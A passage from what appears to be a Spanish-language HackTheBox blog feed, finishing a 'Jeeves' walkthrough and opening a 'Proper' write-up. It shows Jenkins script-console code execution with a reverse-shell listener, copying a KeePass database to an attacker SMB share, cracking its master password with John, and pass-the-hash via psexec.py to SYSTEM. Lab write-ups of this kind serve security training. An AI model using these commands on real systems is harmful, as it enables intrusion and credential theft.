
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/katta/5465317&quot;&gt;https://gist.github.com/katta/5465317&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyCommands.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Prob√©moslo pero con el comando &lt;code&gt;whoami&lt;/code&gt; a vel:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_RCE_whoami.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Liiiistooones, el usuario que esta ejecutando el servicio &lt;strong&gt;Jenkins&lt;/strong&gt; se llama &lt;code&gt;kohsuke&lt;/code&gt; yyyy ya tendr√≠amos ejecuci√≥n remota de comandos (:&lt;/p&gt;

&lt;p&gt;Ese ejemplo me gusto porque es muy sencillo de interpretar. Ahora si intentemos generar la &lt;strong&gt;Reverse Shell&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha por el puerto en el que queremos recibirla, en mi caso en el &lt;code&gt;4433&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nc -lvp 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora en la consola de scripts ejecutar√≠amos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_tryingRevSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le indicamos que nos env√≠e una petici√≥n hacia nuestro puerto &lt;code&gt;4433&lt;/code&gt; y que cuando la establezca nos ejecute una &lt;code&gt;cmd.exe&lt;/code&gt; (terminal).&lt;/p&gt;

&lt;p&gt;Damos clic en &lt;code&gt;Run&lt;/code&gt; yyyyyyyyyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!! Conseguimos la reverse &lt;strong&gt;Shell&lt;/strong&gt; como el usuario &lt;code&gt;kohsuke&lt;/code&gt; y estamos en el sistema (:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Con este script logramos una Shell en la misma ejecuci√≥n del programa:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/jeeves/jenkins_pwn_shell.py&quot;&gt;jenkins_pwn_shell.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;decrypt-jenkins-secrets&quot;&gt;Intentamos desencriptar los secretos de &lt;u&gt;Jenkins&lt;/u&gt; &lt;a href=&quot;#decrypt-jenkins-secrets&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Nuestra primera impresi√≥n al ejecutar &lt;code&gt;dir&lt;/code&gt; es ver muuuuuuuucho archivos, uno con un nombre llamativo (&lt;code&gt;secret.key&lt;/code&gt;) que me hizo volver a un recurso que hab√≠a desechado:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/gquere/pwn_jenkins#files-to-copy-after-compromission&quot;&gt;https://github.com/gquere/pwn_jenkins&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Habla de los ü§´ secretos de &lt;strong&gt;Jenkins&lt;/strong&gt; üò∂ y lo necesario para desencriptarlos, que serian dos archivos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;secrets/master.key&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;secrets/hudson.util.Secret&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Peeero si bajamos un poquito m√°s &lt;a href=&quot;https://github.com/gquere/pwn_jenkins#decrypt-jenkins-secrets-from-groovy&quot;&gt;vemos que podemos intentar desencriptarlos&lt;/a&gt; con el propio &lt;code&gt;Groovy&lt;/code&gt; y sus comandos, pues aprovechemos la consola que tenemos para interactuar con eso‚Ä¶&lt;/p&gt;

&lt;p&gt;Simplemente debemos pasarle el secreto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-groovy&quot;&gt;println(hudson.util.Secret.decrypt(&quot;{...}&quot;))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leyendo &lt;a href=&quot;https://gist.github.com/tuxfight3r/eca9442ff76649b057ab&quot;&gt;ac√°&lt;/a&gt; entendemos el porqu√© hay unos &lt;code&gt;{}&lt;/code&gt; en el ejemplo de arriba, ellos hacen parte del secreto, por lo que en caso de encontrar alg√∫n secreto para lograr desencriptarlo debemos agregar los &lt;code&gt;{}&lt;/code&gt; tambi√©n‚Ä¶&lt;/p&gt;

&lt;p&gt;Enumerando las carpetas vemos el archivo &lt;code&gt;config.xml&lt;/code&gt; en la ruta &lt;code&gt;..\Administrator\.jenkins\\users\admin&lt;/code&gt;; en su contenido hay un &lt;strong&gt;token&lt;/strong&gt; entre &lt;code&gt;{}&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_adminConfigXML_token.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pues probemos la dezencryptazhion:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_ApiToken_decrypt.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos devuelve un &lt;strong&gt;hash&lt;/strong&gt; y ese ser√≠a la flag que va en &lt;code&gt;root.txt&lt;/code&gt; (: Y iaaaaaaaaa, eso es todo por esta m√°quina, veamos la flag del &lt;code&gt;user.txt&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;E.E noup, ese &lt;strong&gt;hash&lt;/strong&gt; debe ser el &lt;code&gt;token&lt;/code&gt; del &lt;strong&gt;API&lt;/strong&gt; en texto plano, pero ¬ønos sirve esto para algo? Por ahora no (no creo que sirva tampoco despu√©s), pero aprendimos e.e&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Enumerando las carpetas de &lt;code&gt;kohsuke&lt;/code&gt; encontramos una base de datos de contrase√±as en &lt;code&gt;Documents&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeSH_dirDocuments.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por si no conoces los archivos &lt;strong&gt;.kdbx&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;üîê &lt;strong&gt;&lt;em&gt;Un objeto con la extensi√≥n &lt;code&gt;.kdbx&lt;/code&gt; es un archivo &lt;u&gt;KeePass Password Database&lt;/u&gt;, la finalidad de estos archivos es almacenar y proteger un grupo de contrase√±as de manera segura. Para acceder a la base de datos se necesita una contrase√±a -madre- o -maestra- que es la encargada de securizar toooooodas las dem√°s contrase√±as.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;M√°s info &lt;strong&gt;KeePass&lt;/strong&gt; y &lt;strong&gt;.kdbx&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/KeePass&quot;&gt;KeePass&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://filext.com/file-extension/KDBX&quot;&gt;Opening KDBX Files&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;keepass2john&quot;&gt;Jugamos con el archivo &lt;u&gt;.kdbx&lt;/u&gt; y obtenemos &lt;u&gt;master password&lt;/u&gt; &lt;a href=&quot;#keepass2john&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Existe una herramienta llamada &lt;a href=&quot;http://kpcli.sourceforge.net/&quot;&gt;kpcli&lt;/a&gt; con la cual podemos jugar para interactuar con la base de datos, pero primero pas√©monos el archivo a nuestro sistema:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\\Users\kohsuke\Documents&amp;gt;copy CEH.kdbx \\10.10.14.2\smbFolder\CEH.kdbx
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± file CEH.kdbx 
CEH.kdbx: Keepass password database 2.x KDBX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta este excelente tutorial del que nos guiaremos para leer la base de datos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server&quot;&gt;How To Use kpcli To Manage KeePass2 Password Files&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ejecutamos la herramienta y le indicamos que vamos a usar el archivo &lt;code&gt;.kdbx&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± kpcli 
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kpcli:/&amp;gt; open CEH.kdbx 
Please provide the master password:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jmmmm, lo que hab√≠amos dicho antes, por lo general es necesaria una password maestra‚Ä¶ Al colocar cualquier cosa obtenemos:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;span style=&quot;color: yellow;&quot;&gt;Couldn‚Äôt load the file CEH.kdbx: The database key appears invalid or else the database is corrupt.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;F, F, F‚Ä¶&lt;/p&gt;

&lt;p&gt;Dando algunas vueltas encontramos este recurso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://tzusec.com/tag/keepass2john/&quot;&gt;Cracking KeePass Database&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En √©l se usa la herramienta &lt;code&gt;keepass2john&lt;/code&gt; la cual obtiene un hash que hace referencia a la &lt;strong&gt;master password&lt;/strong&gt;, depende de que tan fuerte sea para evitar ser crackeada (:&lt;/p&gt;

&lt;p&gt;As√≠√≠√≠√≠√≠√≠ que obtengamos el hash e intentemos crackearlo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Peeerfecto, guard√©moslo en un archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± keepass2john CEH.kdbx &amp;gt; CEH.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora simplemente se lo pasamos a &lt;code&gt;John The Ripper&lt;/code&gt; (que es un &lt;strong&gt;crack&lt;/strong&gt;eador de contrase√±as):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt CEH.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:01:09 DONE (2021-08-17 19:32) 0.01443g/s 793.5p/s 793.5c/s 793.5C/s moonshine1
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;¬øKHE ZE BE POR AY? Tenemos la &lt;strong&gt;&lt;em&gt;master password&lt;/em&gt;&lt;/strong&gt; en texto planooooooooooooooooo.&lt;/p&gt;

&lt;p&gt;Pos volvamos a cargar la base de datos y le pasamos esa pw:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_openDB_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora s√≠√≠√≠√≠√≠√≠√≠√≠, pos retomemos el &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server&quot;&gt;tutorial de antes&lt;/a&gt; y exploremos‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;keepass-cracked&quot;&gt;Vemos credenciales del gestor &lt;u&gt;KeePass&lt;/u&gt; &lt;a href=&quot;#keepass-cracked&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como bien dice el post, la interacci√≥n es muy parecida a la de los comandos &lt;code&gt;*nix&lt;/code&gt;, pero claramente no opera sobre el sistema sino sobre la estructura que tiene la base de datos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kpcli:/&amp;gt; ls
=== Groups ===
CEH/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Existe un grupo (que ser√≠a un apartado para organizar las distintas contrase√±as), entremos en √©l:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kpcli:/&amp;gt; cd CEH/
kpcli:/CEH&amp;gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos tambi√©n algunos grupos, pero lo nuevo son las -entradas-, que serian las contrase√±as que hay guardadas.&lt;/p&gt;

&lt;p&gt;Tenemos la descripci√≥n del usuario y el sitio al que pertenece esa credencial (hay dos bastante curiosas que hacen referencia a servicios locales (pero que no existen en el sistema :P)), por ejemplo si inspeccionamos la password del &lt;strong&gt;banco de america&lt;/strong&gt; tendr√≠amos esta estructura:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Podemos ya sea llamar el index de cada uno (0,1,2,3‚Ä¶) o su nombre (Bank of America, EC-Council‚Ä¶)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kpcli:/CEH&amp;gt; show 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_show1.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La barra roja evita mostrar la contrase√±a a los ojitos, pero si copiamos el contenido y lo pegamos en cualquier otro sitio, vamos a ver la contrase√±a.&lt;/p&gt;

&lt;p&gt;Despu√©s de jugar con todas las entradas obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_showALL.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;psexec&quot;&gt;Obtenemos terminal usando &lt;u&gt;hashes&lt;/u&gt; y &lt;u&gt;psexec.py&lt;/u&gt; &lt;a href=&quot;#psexec&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hay algunas contrase√±as mooooooy llamativas, pero lo que m√°s me llamo la atenci√≥n fue la contrase√±a del index &lt;code&gt;0&lt;/code&gt;, me record√≥ a cuando se dumpea la &lt;a href=&quot;https://en.wikipedia.org/wiki/Security_Account_Manager&quot;&gt;SAM&lt;/a&gt; (archivo que contiene las contrase√±as de los usuarios del sistema), ya que tienen el mismo formato, adjunto prueba e.e&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_dumpSAM.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tomada de &lt;a href=&quot;https://subscription.packtpub.com/book/networking-and-servers/9781788623179/5/ch05lvl1sec76/dumping-the-contents-of-the-sam-database&quot;&gt;packtpub - dumping-the-contents-of-the-sam-database&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si nos fijamos es igualito, si a nuestra credencial le agregamos al inicio un nombre de usuario queda igual, as√≠ que pueda que tengamos un hash de la &lt;strong&gt;SAM&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Lo bueno de tener esto es que podemos usarlas como -contrase√±as- (:&lt;/p&gt;

&lt;p&gt;Usemos &lt;code&gt;psexec&lt;/code&gt; (herramienta para acceder remotamente a un host) para probar el ingreso con los hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± psexec.py Jeeves/Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Le pasamos el hostname (&lt;code&gt;Jeeves&lt;/code&gt;), el usuario (inicialmente probamos con &lt;code&gt;Administrator&lt;/code&gt;) el host y finalmente los hashes, ejecutamos yyyyyyyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_psexec_NTauthoritySYSTEM_SH_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LKA√ë√ë√ë√ë√ësdf√±l√±√ësjdflkasjdflkajsoiJAODIafjsid VAMOOOOOOOOOOO!! Tamos en el sistema como el usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ads&quot;&gt;Extraemos la flag &lt;u&gt;root.txt&lt;/u&gt; de un &lt;u&gt;ADS&lt;/u&gt; &lt;a href=&quot;#ads&quot;&gt;üìå&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Veamos las flags:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirAdministratorDesktop.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_type_hmTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pos no, a√∫n no vamos a ver flags ¬Ø\&lt;em&gt;(„ÉÑ)&lt;/em&gt;/¬Ø, tenemos que buscar el objeto &lt;code&gt;root.txt&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Nos indica que -veamos profundamente-, jmmm.&lt;/p&gt;

&lt;p&gt;Lo primero que se ocurri√≥ fue que podr√≠a estar oculto en alguna ruta del sistema pero neeeeeeelson:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\&amp;gt;powershell -c Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente que iba a hacer era complicarme con ese &lt;code&gt;.lnk&lt;/code&gt; extra√±o del directorio &lt;code&gt;Desktop&lt;/code&gt;, peeeeeeeeero al momento pens√© en intentar buscar archivos ocultos pero dentro de los mismos archivos existentes :o lo tambi√©n llamado &lt;code&gt;Alternate Data Stream&lt;/code&gt;, que seria ocultar informaci√≥n dentro de archivos.&lt;/p&gt;

&lt;p&gt;Les dejo un art√≠culo que hice en su tiempo profundizando a tope en los &lt;strong&gt;ADS&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://lanzt.github.io/article/ads-windows&quot;&gt;Ocultando data en archivos de Windows (con ADS)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos probar inicialmente con &lt;code&gt;dir /r&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;üëÅÔ∏è‚Äçüó®Ô∏è &lt;strong&gt;&lt;em&gt;Display alternate data streams of the file.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir&quot;&gt;docs.microsoft&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A veeeeeeeeeer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirR_ADSfound.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OJOOOOO, existe un archivo oculto dentro de &lt;code&gt;hm.txt&lt;/code&gt; llamado &lt;code&gt;root.txt&lt;/code&gt;, o sea, la flag (: pues veamos su contenido:&lt;/p&gt;

&lt;p&gt;Usaremos el comando &lt;code&gt;more&lt;/code&gt; para revelar el contenido del &lt;strong&gt;ADS&lt;/strong&gt;, de manera normal:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_moreNormal.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora referenciando el &lt;strong&gt;ADS&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114flags.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya tendr√≠amos las flags de la m√°quina (:&lt;/p&gt;

&lt;p&gt;Y finaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal :^D&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Bonita m√°quina, primer acercamiento contra un servidor &lt;strong&gt;Jenkins&lt;/strong&gt; y todas sus locuras. El tema de &lt;strong&gt;KeePass&lt;/strong&gt; me gusto bastante tambi√©n. El &lt;strong&gt;ADS&lt;/strong&gt; no me exploto la cabeza porque ya los conoc√≠a, pero son muy lindos jajaj.&lt;/p&gt;

&lt;p&gt;Meno, nos leeremos otro d√≠a, que est√©s bien y como siempre, a seguir rompiendo de tooooooooooooodo!!&lt;/p&gt;
</description>
        <pubDate>Wed, 25 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/jeeves</link>
        <guid isPermaLink="true">http://localhost:4000/htb/jeeves</guid>
        
        <category>ADS</category>
        
        <category>jenkins</category>
        
        <category>.kdbx</category>
        
        <category>groovy</category>
        
        <category>askjeeves</category>
        
        <category>kpcli</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Proper</title>
        <description>&lt;p&gt;M√°quina Windows nivel dif√≠cil. Agregamos sal a nuestra inyecci√≥n &lt;strong&gt;SQL&lt;/strong&gt;, jugaremos a ganar la &lt;strong&gt;race condition&lt;/strong&gt; y finalmente entre reversing, movimiento lateral, creaci√≥n de scripts en &lt;strong&gt;PowerShell&lt;/strong&gt; y &lt;strong&gt;pipes&lt;/strong&gt; conseguiremos leer archivos del sistema (:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321properHTB.png&quot; alt=&quot;321properHTB&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/13569&quot;&gt;xct&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://www.hackthebox.eu/profile/77141&quot;&gt;jkr&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Manualidades, manual, manos.&lt;/p&gt;

&lt;p&gt;Encontraremos √∫nicamente un servidor web en esta m√°quina, tendremos que jugar mucho (mucho) y leer mucho (ac√° tambi√©n :P), me divert√≠ &lt;strong&gt;bastante&lt;/strong&gt; escribiendo este writeup, perd√≥n lo largo (:&lt;/p&gt;

&lt;p&gt;Empezaremos jugando con una URL que tiene dos par√°metros, en la que encontraremos un &lt;code&gt;SQL injection&lt;/code&gt; en uno de ellos‚Ä¶ Pero para jugar correctamente con √©l, debemos usar un &lt;code&gt;salt&lt;/code&gt; (que encontramos causando errores en las consultas web) para darle el formato correcto a las peticiones, esto para evitar un errorsito.&lt;/p&gt;

&lt;p&gt;Encontraremos credenciales v√°lidas contra un apartado del servidor web llamado &lt;code&gt;/licenses&lt;/code&gt;. Jugando con √©l y unos &lt;code&gt;themes&lt;/code&gt; que nos presenta el sitio web, vamos a encontrar un &lt;code&gt;Remote File Inclusion&lt;/code&gt;, nos aprovecharemos de esa vuln para mediante un &lt;code&gt;race condition&lt;/code&gt; sobreescribir el contenido de un &lt;code&gt;theme&lt;/code&gt; por c√≥digo &lt;code&gt;PHP&lt;/code&gt; ü§≠. Con esto en mente lograremos una sesi√≥n en la m√°quina como el usuario &lt;code&gt;web&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Estando dentro encontraremos un directorio llamativo (ya que no es nativo del sistema) en la ruta &lt;code&gt;C:\Program Files\Cleaner&lt;/code&gt;, que contiene dos binarios, &lt;code&gt;server.exe&lt;/code&gt; y &lt;code&gt;client.exe&lt;/code&gt;, jugando (muuuuuuuucho) con ellos veremos un proceso que borra y restaura archivos del sistema, lo curioso es que en la mitad del proceso genera una copia del archivo borrado y lo encripta, usaremos ese archivo para seguir jugando y finalmente restaurarlo‚Ä¶&lt;/p&gt;

&lt;p&gt;Suena f√°cil (pensarlo tambi√©n) pero jmm, varias cositas para jugar‚Ä¶ Con esto podremos ver el contenido de cualquier objeto del sistema.&lt;/p&gt;

&lt;p&gt;Pero hasta ahora no s√© (y a los que he preguntado) como obtener una Shell en la m√°quina como el usuario &lt;strong&gt;Administrator&lt;/strong&gt;, as√≠ que por ahora solo podemos leer archivos del sistema.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bastaaaaante juego de nuestras manitas y muuuuy realista :)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

